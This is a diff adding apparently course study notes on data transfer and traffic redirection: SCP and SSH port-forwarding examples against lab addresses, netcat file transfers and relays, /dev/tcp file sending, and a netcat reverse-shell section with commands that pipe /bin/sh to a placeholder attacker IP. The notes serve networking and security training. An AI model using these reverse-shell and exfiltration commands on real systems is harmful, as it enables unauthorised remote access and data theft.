@@ -34,4 +34,71 @@ DESCRIBE COMMON METHODS FOR TRANSFERRING DATA
 	Interactive terminal access
   SCP
   	1 Channel
+	TCP Transport (TCP port 22)
+	Uses symmetric and asymmetric encryption
+	Authentication through sign in (username and password) or with SSH key
+	Non Interactive
 	
+	
+	Download a file from a remote directory to a local directory
+		scp student@172.16.82.106:secretstuff.txt /home/student
+	Upload a file to a remote directory from a local directory
+		scp secretstuff.txt student@172.16.82.106:/home/student
+	Copy a file from a remote host to a separate remote host
+		scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+	Download a file from a remote directory to a local directory
+		scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student			#Captial 'P'
+	Upload a file to a remote directory from a local directory
+		$ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student		#Capital 'P'
+		
+	ssh student@172.16.82.106 -L 1111:localhost:22 -NT	
+	
+	Download a file from a remote directory to a local directory
+		scp -P 1111 student@localhost:secretstuff.txt /home/student
+	Upload a file to a remote directory from a local directory
+		scp -P 1111 secretstuff.txt student@localhost:/home/student
+		
+TRAFFIC REDIRECTION USING TOOLS
+	NETCAT
+		NETCAT is the "swiss army knife" networking utility which reads and writes data across network socket connections using the TCP/IP protocol. 
+		It is designed to be a reliable "back end" tool that can be used directly or easily driven by other programs and scripts.
+		Can be used for the following:
+			inbound and outbound connections, TCP/UDP, to or from any ports
+			troubleshooting network connections
+			sending/receiving data (insecurely)
+			port scanning (similar to -sT in Nmap)
+		NETCAT: CLIENT TO LISTENER FILE TRANSFER
+			Client (sends file): nc 10.2.0.2 9001 < file.txt
+			Listener (receive file): nc -l -p 9001 > newfile.txt
+			
+		mknod thisisname p
+		mkfifo MyPipe
+		
+		NETCAT: LISTENER TO CLIENT FILE TRANSFER
+			Listener (sends file): nc -l -p 9001 < file.txt
+			Client (receive file): nc 10.2.0.2 9001 > newfile.txt
+		NETCAT RELAY DEMOS
+			On Client Relay:
+				mknod mypipe p
+				nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
+				nc -lp 3333 > MyPipe | nc -lp 4444
+			On Listener2 (sends info):
+				nc -l -p 9002 < infile.txt
+			On Listener1 (receives info):
+				nc -l -p 9001 > outfile.txt
+			Writes the output to listener1 and listener2 through the named pipe
+		FILE TRANSFER WITH /DEV/TCP
+			On the receiving box:
+				nc -l -p 1111 > file.txt
+			On the sending box:
+				cat file.txt > /dev/tcp/10.2.0.2/1111
+			This method is useful for host that does not have NETCAT available.
+		REVERSE SHELL USING NETCAT
+			When shelled into the remote host using -c :
+				nc -c /bin/sh <your ip> <any unfiltered port>
+			You could even pipe BASH through NETCAT.
+				/bin/sh | nc <your ip> <any unfiltered port>
+			Then listen for the shell.
+				nc -l -p <same unfiltered port> -vvv
+			You can also listen using the -e with NETCAT.
+				nc -l -p <any unfiltered port> -e /bin/bash
